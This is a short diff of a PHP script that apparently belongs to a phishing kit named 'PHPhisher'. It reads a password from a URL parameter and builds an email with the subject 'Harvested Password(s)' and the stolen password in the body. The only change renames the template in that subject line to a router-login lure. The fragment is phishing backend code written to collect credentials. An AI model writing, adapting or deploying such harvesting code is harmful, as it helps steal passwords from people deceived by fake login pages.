@@ -1,7 +1,7 @@
 <?php
 $password = $_GET['password'];
 
-$subject ="Harvested Password(s) (Connection_Reset_Template)";
+$subject ="Harvested Password(s) (Router_Template)";
 $message="Password: $password";
 $header="from: PHPhisher";
 $to ='test@test.com';
